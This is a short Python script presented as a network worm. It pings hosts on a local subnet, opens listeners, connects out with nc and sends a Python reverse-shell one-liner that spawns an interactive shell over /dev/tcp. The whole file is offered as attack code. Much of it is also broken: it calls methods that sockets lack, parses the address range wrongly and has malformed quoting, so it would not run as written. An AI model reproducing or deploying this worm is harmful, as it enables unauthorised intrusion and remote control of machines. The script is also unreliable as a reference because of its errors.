import random
import socket
import subprocess
import time
import os
import select

def worm():
  net = "192.168.1.0/24"
  while True:
      active_hosts = scan_network(net)
      if active_hosts:
          first_host = active_hosts[0]
          # Create the active hosts file
          with open(f"active_hosts_{random.randint(10000, 99999)}.txt", 'w') as active_hosts_file:
              active_hosts_file.write('\n'.join(active_hosts))

          # Start a listener on the first host with a random port
          listener_port = random.randint(10000, 65535)
          first_host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          first_host_socket.bind((first_host, listener_port))
          first_host_socket.listen(1)

      time.sleep(random.randint(60, 120))  # Sleep for a random interval between 1 and 2 minutes
      c, addr = first_host_socket.accept()
      target_host, target_port = addr
      c.dup2(c.fileno())  # Redirect stdin, stdout, and stderr to the client connection

      # Create a new listener for the newly infected host
      infected_host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      infected_host_socket.bind(("127.0.0.1", 5555))
      infected_host_socket.listen(1)
      infected_client, infected_addr = infected_host_socket.accept()
      infected_client.dup2(infected_client.fileno())  # Redirect stdin, stdout, and stderr to the newly infected client

      # Reverse shell on the newly infected host using a different command
      subprocess.call(["nc", target_host, target_port])
      infected_client.send(f"python -c 'import subprocess,os,sys,random,time; os.dup2(os.open(\"/dev/tcp/{first_host}:{listener_port}\", os.O\_RDWR)[0].close());p=subprocess.call(["/bin/sh","-i"])'".encode())
      infected_client.send(b"\x01")

def scan_network(net):
  active_hosts = []
  for ip in range(int(net.split("/")[0].rstrip("."), 16), int(net.split("/")[1].split(".")[0]) * (2 ** 32) + 1):
      ip_address = f"{net.split('/')[0]}.{ip}"
      if ping(ip_address):
          active_hosts.append(ip_address)
  return active_hosts

def ping(ip):
  try:
      response = subprocess.check_output(f"ping -c 1 {ip}", shell=True, stderr=subprocess.DEVNULL)
      return True
  except subprocess.CalledProcessError:
      return False

if __name__ == "__main__":
  worm()
